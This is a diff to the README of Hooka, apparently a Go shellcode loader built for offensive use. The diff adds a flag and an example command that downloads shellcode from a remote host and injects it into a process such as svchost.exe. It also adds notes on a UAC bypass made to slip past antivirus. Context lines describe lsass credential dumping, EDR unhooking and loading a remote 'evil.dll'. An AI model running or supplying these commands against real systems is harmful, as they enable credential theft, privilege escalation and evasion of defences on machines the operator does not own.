@@ -41,6 +41,7 @@ However I've also taken some code from [BananaPhone](https://github.com/C-Sto/Ba
   - EarlyBirdAPC
   - UuidFromString
 
+- Inject shellcode into a process (not stable and only works via CreateRemoteThread technique)
 - Dump lsass.exe process to a file
 - Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
 - Test mode (injects a calc.exe shellcode)
@@ -94,6 +95,8 @@ go build .
         dinamically detect hooked functions by EDR
   -lsass string
         dump lsass.exe process memory into a file to extract credentials (run as admin)
+  -pid int
+        PID to inject shellcode into (default: self)
   -remote-dll string
         remote url where DLL is stored, especify function separated by comma (i.e. http://192.168.1.37/evil.dll,xyz)
   -t string
@@ -128,6 +131,11 @@ go build .
 ```sh
 .\Hooka.exe --dll evil.dll,xyz
 .\Hooka.exe --remote-dll http://192.168.1.37/evil.dll,xyz
+```
+
+> Inject shellcode into remote process (i.e. svchost.exe) **Not all techniques covered!!**
+```sh
+.\Hooka.exe --url http://192.168.116.37/shellcode.bin --pid 5864
 ```
 
 > Decode shellcode as hex or base64
@@ -179,11 +187,9 @@ As you can see Hooka provides a lot of CLI flags to help you in all kind of situ
 
 :black_square_button: `--pid` flag to handle process injection
 
-:black_square_button: Sandboxing functions
+:ballot_box_with_check: Sandboxing functions
 
 :black_square_button: Native golang [Phant0m](https://github.com/hlldz/Phant0m) to suspend EventLog threads
-
-:black_square_button: Integrated Seatbelt.exe using CLR
 
 :black_square_button: Test unhooking functions against EDRs
 
@@ -196,6 +202,10 @@ To use the official package API see [here](https://github.com/D3Ext/Hooka/tree/m
 Do you wanna improve the code with any idea or code optimization? You're in the right place
 
 See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)
+
+# Known issues
+
+The UAC bypass is not used in the main Hooka loader but you can call the functions using the `pkg/hooka` package. To avoid being detected by AVs, the `ExecUac` function receives a path to execute as administrator (i.e. C:\Windows\System32\cmd.exe) and then it copies the binary to the TEMP folder with a random name. So keep in mind that if you abuse this feature you may notice that you have some .exe files in that dir because the file can't be removed while it is running. However I've created another function called `RemoveUacFiles()` which removes all these files, just ensure that you use it when UAC bypass isn't executing that binary.
 
 # References
 
